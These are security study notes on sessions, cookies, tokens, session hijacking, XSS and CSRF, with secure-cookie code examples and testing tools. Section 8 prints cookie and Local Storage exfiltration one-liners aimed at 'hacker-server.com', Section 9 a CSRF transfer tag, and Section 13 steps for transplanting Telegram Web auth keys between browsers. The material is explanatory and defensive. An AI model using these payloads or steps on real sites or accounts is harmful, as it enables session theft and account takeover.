# Sessions, Cookies & Session Hijacking — Complete Notes

Sessions and cookies are the backbone of how the web "remembers" a logged-in user. Understanding how they work — and exactly how attackers abuse them — is essential both for web development and for offensive/defensive security (CEH-style) study. These notes walk through the full lifecycle: how a session is created, how it's stored, how it can be stolen, and how to defend it properly.

---

## 1. The Core Idea: Why Sessions Exist

HTTP is a **stateless** protocol — by design, the server forgets who you are the moment a request finishes. Without some mechanism to "remember" you, every single page load would require you to log in again.

A simple way to think about it: logging in is like getting an entry wristband at an amusement park. You show your ticket once at the gate (login), and for the rest of the day you just flash the wristband (cookie) instead of buying a new ticket for every ride.

### The Four-Step Flow

| Step | What Happens |
|---|---|
| **1. Authentication** | The user submits credentials (e.g., `username: rahul_123`, `password: secret789`). The server checks them against the database. |
| **2. Session Creation** | If the credentials are valid, the server creates a session — a record (in memory or a database) holding details like User ID and login time. This record is identified by a unique **Session ID**, e.g. `Session_ID: xyz_987654321`. |
| **3. Cookie Transmission** | The server sends this Session ID to the browser via a response header: `Set-Cookie: session_id=xyz_987654321`. The browser stores it in a small local file — the cookie. |
| **4. Subsequent Requests** | On every later request (viewing "My Profile," adding to cart, etc.), the browser automatically attaches the cookie. The server looks up the ID, confirms it belongs to a logged-in user, and serves the personalized response — no re-login needed. |

**Real-life analogy:** You walk into a coffee shop and give your name, "Rahul," to get a membership card made (login). The shop's register logs "Rahul – Member ID 505" (session). They stamp your hand (cookie). An hour later, you don't repeat your name — you just show the stamp, and the manager checks the register and says, "Hello Rahul, your 10% discount is ready" (subsequent request).

---

## 2. Cookies vs. Sessions

These two terms are often used together but refer to different things — one lives on the client, the other on the server.

| Feature | Cookie | Session |
|---|---|---|
| **Location** | Stored in the browser (client-side) | Stored in server memory/database |
| **Data Held** | Just the Session ID or small preferences | Sensitive data — User ID, permissions, etc. |
| **Security** | Less secure (accessible if the browser is compromised) | More secure (stays under server control) |
| **Expiry** | Configurable (e.g., auto-delete after 7 days) | Ends on logout or when the browser closes |

> **Note:** Modern apps don't rely on cookies alone anymore — **JWT (JSON Web Tokens)** are widely used too, especially in mobile apps. That said, traditional server-side sessions are still the backbone of banking and other high-security websites.

---

## 3. Cookie Types: Session (Normal) vs. Persistent

| Feature | Normal (Session) Cookie | Persistent Cookie |
|---|---|---|
| **Lifetime** | Only while the browser stays open | Until a fixed expiry date (e.g., 6 months) |
| **Storage** | RAM (temporary memory) | Hard drive (permanent until expiry) |
| **On Logout/Close** | Deleted immediately when the browser closes | Survives a browser restart |
| **Typical Use Case** | Net banking (security-driven) | "Remember Me" on Instagram/Facebook |

---

## 4. Beyond Cookies: Local Storage & IndexedDB

Not every web app uses cookies for session data. A good example is **Telegram Web**, where the browser's Cookies panel in DevTools is completely empty. This isn't a bug — it's a deliberate design choice.

### Why Telegram (and many modern SPAs) Skip Cookies

| Reason | Explanation |
|---|---|
| **Size limit** | Cookies cap out around 4KB. Authentication keys (like a long `auth_key` string) often don't fit. Local Storage offers up to ~5MB. |
| **Performance** | Cookies are sent with *every* HTTP request automatically, which adds overhead. Local Storage data is only sent when the application code explicitly requests it. |
| **Modern architecture** | Telegram is a Single Page Application (SPA) and relies on the Web Storage API instead of the older cookie-based model. |

### What You'll Actually Find There

Inspecting `web.telegram.org` under **Application → Local Storage** typically reveals:

- `user_auth` — encrypted login details
- `dc4_auth_key` — the secret key used to communicate with Telegram's servers
- `account1`, `account2` — separate data for each logged-in account (Telegram supports multi-account)

Under **IndexedDB**, a key like `authState: authStateSignedIn` is what tells the browser "this user is already logged in."

A numeric-looking value (e.g., an `id` field like `2139307714`) sitting inside Local Storage is **not** a cookie — it's an internal Local Storage identifier, typically the Telegram User ID or session identifier, often paired with a `dcID` indicating which Telegram data center the account is connected to.

> **Takeaway:** "Persistent login" doesn't always mean a Persistent Cookie. Telegram achieves the same result using persistent *Local Storage* instead.

---

## 5. What Is a Token?

A **token** is a unique identifier that proves who you are after login, so the server doesn't need your username/password on every request.

**Analogy:** You show ID once at a club entrance (login). The bouncer gives you a wristband (token). After that, staff only check the wristband — not your ID — every time you move around the venue.

### How Token-Based Auth Works

1. **Login** — client sends credentials to the server.
2. **Verification** — server checks the credentials.
3. **Token issuance** — if valid, the server creates and sends a token, stored client-side in a cookie, Local Storage, or Session Storage.
4. **Token usage** — the client attaches the token to every subsequent request, typically in a header:

```
Authorization: Bearer <token>
```

5. **Validation** — the server checks the token on each request: valid → request allowed; invalid/expired → rejected.

### Types of Tokens

| Type | Characteristics |
|---|---|
| **Session Token (Session ID)** | Stored server-side; client just holds a reference ID. Traditional approach. |
| **JWT (JSON Web Token)** | Self-contained — carries user info inside the token itself. No server-side session storage needed. Common in modern apps and APIs. |

### Why Tokens Matter

- Avoids repeatedly transmitting passwords
- Enables **stateless authentication** (particularly with JWT)
- Standard for APIs, mobile apps, and SPAs

### The Risk

If a token is stolen, the attacker can act as the victim — no password required. This is why systems pair tokens with **HTTPS, expiration times, secure cookie flags, and refresh tokens**.

---

## 6. Cookie Security Flags

When a server sets a secure cookie, the response header looks like this:

```http
Set-Cookie: session_id=xyz12345abc; Expires=Fri, 05 Jun 2026 12:00:00 GMT; Path=/; Domain=web.telegram.org; Secure; HttpOnly; SameSite=Strict
```

### Breaking Down Each Attribute

| Attribute | Purpose |
|---|---|
| `session_id=xyz12345abc` | The unique token generated by the server for this user |
| `Secure` | Cookie is sent **only** over HTTPS — prevents exposure over plain HTTP / network sniffing on public Wi-Fi |
| `HttpOnly` | Blocks JavaScript from reading the cookie via `document.cookie` — the single most important defense against XSS-based theft |
| `SameSite=Strict` | Cookie is only sent when the request originates from the same site — blocks CSRF attacks |
| `Path=/`, `Domain=...` | Defines which parts of the site/domain the cookie is valid for |

### Storage Security Comparison

| Feature | Cookies (with flags) | Local Storage | IndexedDB |
|---|---|---|---|
| **JS Accessibility** | Blocked (with `HttpOnly`) | Always accessible | Always accessible |
| **XSS Protection** | High | Very low | Very low |
| **Capacity** | Small (~4KB) | Medium (~5MB) | Large (best for bulk data) |
| **Best For** | Authentication tokens | User preferences | Large offline datasets |

**Verdict:** `HttpOnly` cookies remain the gold standard for storing authentication tokens, because no lock like `HttpOnly` exists for Local Storage or IndexedDB — any script running on the page can read them freely. Apps like Telegram that need to store large amounts of data (chat history, files) offline use IndexedDB anyway, but it requires much stricter XSS-prevention coding to stay safe.

---

## 7. Session Hijacking

### What It Is

Session hijacking (a.k.a. **session takeover**) occurs when an attacker obtains a valid user's active session ID or token without authorization and uses it to impersonate that user. Critically, the attacker **never needs the username or password** — the server simply trusts whoever presents a valid token.

### Where It Comes From (Attack Surface)

- **Weak session management** — predictable or simple session IDs
- **Poor authentication processes** — weak login-time security
- **Bad cryptographic implementation** — tokens sent unencrypted (plain text) over the network

### Impact

- **Account compromise** — full control of the victim's account
- **Data theft** — personal information and private files exposed
- **Unauthorized transactions** — financial loss on banking/shopping platforms
- **Lateral movement** — attacker uses the foothold to reach other parts of the system

### Why It's Easy When Apps Get the Basics Wrong

| Weakness | Consequence |
|---|---|
| **Weak/predictable session IDs** (e.g., `Session_ID=1`, `2`, `3`) | Attacker can guess or enumerate valid tokens |
| **Insecure cookies** (no `HttpOnly`, `Secure`, `SameSite`) | Wide open to client-side attacks |
| **Improper session handling** | Session ID isn't regenerated after login, or sessions never expire |

---

## 8. XSS: The Primary Engine of Session Hijacking

Cross-Site Scripting (XSS) is considered the single biggest threat to session security — especially for apps that store tokens in Local Storage or IndexedDB, which have **no equivalent to the `HttpOnly` lock**.

### The Attack Flow

1. **Injection** — the attacker plants malicious JavaScript into a trusted website (e.g., via a comment box or a crafted URL parameter). The browser trusts this script because it believes the site's own developers wrote it.
2. **Access** — when a victim loads the page, the script runs in their browser with full access to read `document.cookie` or `localStorage.getItem('auth_token')`.
3. **Exfiltration** — the stolen token is silently sent to a server the attacker controls.

### How Exfiltration Actually Happens

Browsers will flag obvious cross-origin data transfers, so attackers favor sneaky-looking requests that don't trigger user suspicion.

**Method 1 — Disguised as an image load:**

```javascript
new Image().src = "https://hacker-server.com/log?cookie=" + document.cookie;
```

The browser thinks it's just loading a picture and sends the request without hesitation — silently leaking the cookie in the URL's query string.

**Method 2 — A direct POST request (stealthier, harder to notice without checking the Network tab):**

```javascript
fetch('https://hacker-server.com/collect', {
  method: 'POST',
  body: JSON.stringify({ stolenData: localStorage.getItem('user_auth') })
});
```

### Where the Stolen Data Actually Ends Up

The attacker never sees the stolen data appear in the victim's own browser or URL bar — that would immediately tip off the victim. Instead, it's exfiltrated to infrastructure the attacker controls ahead of time:

- **Webhook services** (e.g., Webhook.site, RequestBin) — disposable URLs that log every incoming request
- **A custom VPS** — a cheap cloud server running a script or web server that records access logs

A typical log entry on the attacker's side looks like:

```
[05/May/2026:12:00:01] GET /log?cookie=session_id=2139307714;user=rohit  Chrome/Windows 11
```

From there, the attacker simply opens DevTools on their own browser, manually sets that same `session_id` value, and the server treats them as the legitimate user.

> **Blue Team note:** This is exactly what a SOC analyst watches for — outbound traffic to unknown or unrecognized domains carrying what looks like session data in the query string or POST body.

---

## 9. CSRF (Cross-Site Request Forgery)

### What It Is

CSRF tricks a victim's browser into performing an action on a site where they're already authenticated — without their knowledge or consent. Unlike XSS, the attacker doesn't need to steal anything; they just need the victim's browser to *carry* the existing session along to a forged request.

**Analogy:** You're logged into your bank. You then visit an unrelated, malicious website. That site secretly fires a request like *"transfer ₹10,000 to attacker."* Because your browser automatically attaches your bank's session cookie to any request to that domain, the bank's server has no way to tell this request apart from one you intended to make.

### How It Works

1. Victim logs into a trusted site (bank, social media, etc.) — browser stores the session cookie.
2. Victim visits a malicious site (often without realizing it).
3. The malicious site triggers a hidden request to the trusted site.
4. The browser automatically attaches the victim's session cookie to that request.
5. The server processes it as if the victim intentionally made it.

A request can be triggered with something as simple as an image tag:

```html
<img src="https://bank.com/transfer?amount=10000&to=attacker">
```

Just loading that "image" sends the transfer request.

### Why It Happens

Browsers automatically attach cookies to requests regardless of where the request originated, and by default have no way to verify that the *user* (rather than a malicious script) intended to make that request.

### Prevention

| Defense | How It Helps |
|---|---|
| **CSRF Tokens** | Server generates a random, unguessable token that must accompany every sensitive request |
| **SameSite Cookies** | Prevents cookies from being sent on cross-site requests |
| **Origin/Referer header checks** | Confirms the request genuinely originated from the expected site |
| **Custom headers (for APIs)** | Harder for an external site to forge, since simple HTML forms can't set custom headers |

### CSRF vs. XSS

| Attack | What It Does |
|---|---|
| **CSRF** | Tricks the user's browser into *sending* an unintended request |
| **XSS** | Injects malicious script directly *into* the website itself |

**One-line summary:** CSRF abuses an already-logged-in session to perform actions without the user's permission.

---

## 10. Spoofing vs. Hijacking

These two terms get conflated often, but they differ in both **timing** and **mechanism**.

- **Spoofing** = faking an identity to get in.
- **Hijacking** = taking over a session that's already legitimately running.

### Spoofing

Occurs when an attacker disguises their own identity as someone else's to gain entry or deceive a target — typically **before or during authentication**.

- **How:** Faking an IP address, MAC address, or email sender identity.
- **Example:** A phishing email crafted to look exactly like it's from your bank (email spoofing), or a device on the network presenting your router's MAC address as its own (ARP spoofing).
- **Goal:** Get the victim or system to trust the attacker as someone legitimate.

### Hijacking

Occurs **after** a legitimate user has already authenticated — the attacker steals control of that already-running session.

- **How:** Stealing the victim's active session token/cookie and presenting it to the server.
- **Example:** Stealing a `user_auth` token from Telegram's Local Storage after the victim has already logged in — no password required.
- **Goal:** Gain control of an established connection without needing any credentials.

### Comparison Table

| Feature | Spoofing | Hijacking |
|---|---|---|
| **Core idea** | Pretending to be someone else | Taking over an active session |
| **Authentication state** | User has not yet logged in | User is already logged in |
| **Credentials needed** | Sometimes required | Not required — only a valid token |
| **Network layer** | Usually lower layers (IP, MAC) | Usually application layer (sessions, cookies) |
| **Complexity** | Deceiving the system is relatively simple | Requires intercepting/monitoring an active session |

**Simple way to remember it:** If someone makes a duplicate key to your house and walks in, that's spoofing. If you open your own front door and someone shoves you aside to walk in and sit down themselves, that's hijacking.

---

## 11. Attack Varieties Under Session Hijacking

| # | Attack | Mechanism | Analogy |
|---|---|---|---|
| **1** | **Cookie Theft** | Attacker directly extracts a valid cookie/token — via XSS injection, malware scanning the browser's storage, or sniffing unencrypted traffic on public Wi-Fi. | A pickpocket cutting your VIP entry card straight out of your pocket. |
| **2** | **Session Fixation** | Attacker pre-generates a valid session ID and tricks the victim into using it (e.g., a link like `bank.com/login?session_id=Hacker123`). When the victim logs in, they unknowingly validate the attacker's pre-known ID. | A thief makes a duplicate key for an empty locker and drops it where you'll find it. You use that key, put your belongings inside — but the thief already has a copy. |
| **3** | **Man-in-the-Middle (MitM)** | Attacker positions themselves between client and server, intercepting the session token in transit. Common when HTTPS isn't enforced or the victim is on a fake/rogue Wi-Fi hotspot. | A postman secretly opens a letter between two friends, reads or alters it, then forwards it along. |
| **4** | **Session Replay** | Attacker doesn't need live control — they capture a valid session token and "replay" it later to the server, gaining access as if they were the original user. | A car remote's radio signal is recorded; later, replaying that exact signal unlocks the car again. |

### Defenses Against Each

| Attack Type | Best Defense |
|---|---|
| Cookie Theft | `HttpOnly` flag (prevents script-based reading) |
| Session Fixation | Regenerate the Session ID immediately after login |
| MitM | HSTS + mandatory HTTPS everywhere |
| Session Replay | Include timestamps and a nonce (number used once) in tokens |

---

## 12. Clearing Up a Common Misconception: "But the Token Is Only Generated Once"

A frequent point of confusion: if a token is generated just one time, how can a replay attack work?

The key distinction is **generation vs. reuse**. The server doesn't generate a *new* token on every request — it issues one token that stays valid until it expires, and the server simply checks "is this token still valid?" on each incoming request. It does **not**, by default, check *who* is sending it or whether it's been seen before.

**Analogy:** The server hands you a VIP pass marked "Valid for 24 Hours." Every time you show it at the gate, the guard lets you in — the pass is still original and unexpired. A replay attack happens when a thief photographs that pass, and later shows the photo after you've left. The guard only checks "is this a valid pass?" — not "is this the same person who got it issued?"

### Step-by-Step

1. **Capture** — attacker sniffs network traffic (e.g., with Wireshark) or accesses the victim's device, capturing the data packet containing the token.
2. **Storage** — the token is saved by the attacker; no password is needed.
3. **Replay** — the attacker later sends the exact same request, with the same token, to the server.
4. **Access granted** — the server sees a valid, unexpired token and grants access, with no way to tell it apart from the original holder's request.

### Why "Generated Once" Doesn't Save You

- **No one-time-use logic** — if the server only checks validity, not freshness, the attack succeeds.
- **Lack of a nonce** — without a unique number required per-request, the server can't detect a replayed request.
- **Long session expiry** — a 30-day-valid session gives an attacker a 30-day window to replay the stolen token.

### The Real Fix

Developers use **request signing** combined with **timestamps**: each request carries a fresh signature valid only for a few seconds. A replayed request arriving even a minute later carries an expired signature and gets rejected.

---

## 13. Practical Demonstration: Manually Transplanting a Session

This is the same technique an attacker uses to hijack a session — moving session data from one browser to another. Because apps like Telegram store session data in Local Storage rather than `HttpOnly` cookies, this can be done manually with DevTools (and is a useful exercise for understanding the vulnerability — only ever try this on your own account).

### Step 1: Export From the Logged-In Browser

1. Open DevTools (`F12`) → **Application** tab.
2. Go to **Local Storage** → select the site (e.g., `https://web.telegram.org`).
3. Locate the relevant keys (notably `user_auth` and `dc_auth_key`).
4. Copy each key's value and save it somewhere safe, like a text file.

### Step 2: Import Into an Incognito Window

1. Open an Incognito window and navigate to the same site — it will prompt for login. **Don't log in.**
2. Open DevTools → **Application → Local Storage** again — the table will be empty.
3. Manually add each key/value pair you saved, matching the key names exactly.

### Step 3: Refresh

Refresh the page. If the correct keys and values were copied, the site loads directly into the logged-in session — no password required.

### Challenges in Practice

- **IndexedDB complexity** — some session data lives in IndexedDB rather than Local Storage, and copying it manually is much harder since it's stored in a structured database format rather than simple key-value pairs. Real attackers often use browser extensions or scripts to copy entire storage stores at once.
- **Token expiry is shared** — logging out from the original browser invalidates the session everywhere, including the "transplanted" copy, since the server deletes that session ID.

### Security Takeaway

This demonstrates that anyone with even brief (2-minute) physical access to an unlocked laptop can extract a full session without ever knowing the account password. Practical rules that follow from this:

- Never log into sensitive accounts on an unknown/shared device.
- Always log out properly after finishing — simply closing the browser tab is not the same as logging out.

---

## 14. Testing for Session-Related Vulnerabilities

A mix of quick manual checks and dedicated tools are used (by both red and blue teams) to assess whether an application's session handling is secure.

### 1. Browser DevTools (Fastest Check)

- Open `F12` → **Application → Cookies**.
- Inspect the `HttpOnly`, `Secure`, and `SameSite` columns.
- **Missing `HttpOnly`** → cookie can be stolen via XSS.
- **Missing `Secure`** → cookie can be sniffed over insecure (HTTP/public Wi-Fi) connections.

### 2. Nmap Scripting Engine (NSE)

Nmap isn't just for port scanning — it has built-in scripts for web vulnerability checks:

```bash
nmap -p 80,443 --script http-cookie-flags <target-website>
```

This connects to the target and reports whether the cookies it sets are missing security flags like `HttpOnly` or `Secure`.

### 3. Burp Suite Sequencer (Statistical Predictability Test)

Used specifically to check whether session IDs are *predictable* rather than truly random:

1. Intercept a login request in Burp Suite.
2. Send it to the **Sequencer** tool.
3. Sequencer requests 100–200 fresh tokens and runs statistical analysis on them.
4. **Result:** reveals whether tokens are truly random or follow a guessable pattern (e.g., sequential numbers like 101, 102, 103) — which would make them vulnerable to enumeration attacks.

### 4. Manual Guessing Test

A quick sanity check: log in from two different devices at the same time and compare the resulting session IDs. If they're suspiciously similar (e.g., only the last 2–3 characters differ), the server's random number generator is weak.

### Summary Table

| What to Check | Tool | Why |
|---|---|---|
| Security flags present | Browser DevTools / Nmap | Quick visual/automated check |
| ID predictability | Burp Suite Sequencer | Statistical randomness analysis |
| XSS vulnerability | Manual payload testing (`<script>`) | Confirms whether injected scripts can read cookies |

### Other Common Attack/Audit Tools

| Tool | Purpose |
|---|---|
| **Burp Suite / OWASP ZAP** (Intercepting Proxies) | Sit between browser and server like a controlled MitM — inspect the `Cookie:` header, test token strength, and replay old requests via the Repeater to check if expired tokens still work |
| **Wireshark** (Network Sniffer) | Captures raw packets off the network interface. If a site uses plain HTTP, login details and cookies appear in plain text — the most direct path to cookie theft |

---

## 15. Defense Mechanisms

### Secure Cookie Flags (Recap)

The three flags from Section 6 work together to "armor" a cookie:

- **`HttpOnly`** — blocks JavaScript access, neutralizing XSS-based cookie theft.
- **`Secure`** — restricts the cookie to HTTPS-only transmission.
- **`SameSite`** — restricts the cookie to same-site requests, blocking CSRF.

### HTTPS Enforcement (HSTS)

Implementing **HSTS (HTTP Strict Transport Security)** forces the browser to always use an encrypted connection, which shuts down MitM attacks that rely on downgrading a connection to plain HTTP.

### Token Rotation

The most effective way to limit the *blast radius* of a hijacked session: regenerate the Session ID after major actions (password change, payment, or right after login). Even if an attacker holds an old token, it becomes instantly useless.

### Content Security Policy (CSP)

Setting security flags alone isn't the full picture — a well-configured **Content Security Policy** tells the browser which domains are allowed to execute scripts on the page. Even if an attacker manages to inject a script via XSS, CSP can block it from executing at all.

---

## 16. Implementing Secure Cookies (Code Examples)

### PHP

For native session cookies, set parameters before `session_start()`:

```php
session_set_cookie_params([
    'lifetime' => 3600,
    'path' => '/',
    'domain' => 'yourdomain.com',
    'secure' => true,      // HTTPS only
    'httponly' => true,    // Hidden from JavaScript
    'samesite' => 'Strict' // CSRF protection
]);
session_start();
```

For manually-set custom cookies via `setcookie()`:

```php
setcookie("user_pref", "dark_mode", [
    'expires' => time() + 3600,
    'path' => '/',
    'secure' => true,
    'httponly' => true,
    'samesite' => 'Lax'
]);
```

### Node.js (Express)

Using the `express-session` middleware:

```javascript
const session = require('express-session');

app.use(session({
  secret: 'your_secret_key',
  resave: false,
  saveUninitialized: true,
  cookie: {
    secure: true,       // HTTPS mandatory
    httpOnly: true,     // XSS protection
    sameSite: 'strict', // CSRF protection
    maxAge: 60000        // 1-minute expiration
  }
}));
```

> **Note:** With `secure: true`, cookies won't be set over plain `http://localhost` during development — only enable this in a production HTTPS environment.

### Python (Flask / Django)

**Flask:**

```python
app.config['SESSION_COOKIE_HTTPONLY'] = True
app.config['SESSION_COOKIE_SECURE'] = True
```

**Django** (in `settings.py`):

```python
SESSION_COOKIE_HTTPONLY = True
CSRF_COOKIE_HTTPONLY = True
```

> Django enables several of these by default, but it's still worth explicitly verifying them in `settings.py`.

---

## 17. Case Study: Auditing Real Cookies (iicseh.com Example)

A real cookie inspection from a live site illustrates the gap between "good" and "risky" practice on the same domain.

### Risky: Analytics/Tracking Cookies

Cookies like `_clck`, `_clsk`, and `_ga` (Microsoft Clarity and Google Analytics) were found with **empty `HttpOnly` and `Secure` columns** — meaning a simple XSS script could read their values via `document.cookie`.

In practice this is lower-risk than it sounds: these cookies track browsing behavior, not login sessions, which is likely why developers didn't bother flagging them.

### Secure: `roundcube_cookies`

This cookie (belonging to a webmail service) had **both `HttpOnly` and `Secure` ticked** — a textbook example of best practice:

- `HttpOnly` ✓ — no JavaScript, including an attacker's injected script, can read it.
- `Secure` ✓ — only ever transmitted over encrypted HTTPS.

This protects the actual mail/login session from hijacking.

### Gap: Missing `SameSite`

Across the board, the `SameSite` column was empty for every cookie on the site — leaving it somewhat exposed to CSRF, since the browser has no instruction restricting these cookies to same-site requests only.

### What This Teaches

| Cookie Type | Observed State |
|---|---|
| Analytics cookies | Open / insecure |
| System/session cookies (`roundcube_cookies`) | Protected (`HttpOnly` + `Secure`) |

From an attacker's perspective: the analytics cookies are easy pickings, but the actual login-handling cookie is properly hardened — reaching it would require something well beyond basic XSS.

---

## Key Takeaways / Exam Summary

- **Sessions live server-side; cookies live client-side** — the cookie is just a pointer (Session ID) to server-stored data.
- HTTP is stateless — sessions and cookies exist purely to simulate a continuous, "logged-in" experience.
- Modern SPAs (e.g., Telegram) may skip cookies entirely in favor of **Local Storage / IndexedDB**, mainly due to size limits and performance — but this comes at a security cost, since neither has an `HttpOnly`-style protection.
- The three cookie security flags to know cold: **`HttpOnly`** (blocks JS access → stops XSS-based theft), **`Secure`** (HTTPS-only), **`SameSite`** (blocks CSRF).
- **Session Hijacking** = stealing an *already-authenticated* session/token. **Spoofing** = faking identity *before* authentication. Different timing, different layers.
- Four major hijacking techniques: **Cookie Theft, Session Fixation, MitM, Session Replay** — each has a distinct mechanism and a distinct defense.
- A token being "generated once" does not protect against replay — protection comes from **nonces, timestamps, and request signing**, not from how the token was created.
- **XSS** is the most common engine behind session hijacking when tokens are stored anywhere JavaScript can read them.
- **CSRF** differs fundamentally from XSS: it doesn't steal anything — it abuses an existing valid session to trigger unwanted actions.
- Defense-in-depth for session security = **secure cookie flags + HSTS/HTTPS everywhere + session ID regeneration on login + CSP + short-lived tokens**.
- Tools to know for testing: **Browser DevTools** (quick flag check), **Nmap `http-cookie-flags`** (automated flag audit), **Burp Suite Sequencer** (statistical randomness of session IDs), **Wireshark** (raw traffic / plaintext exposure).
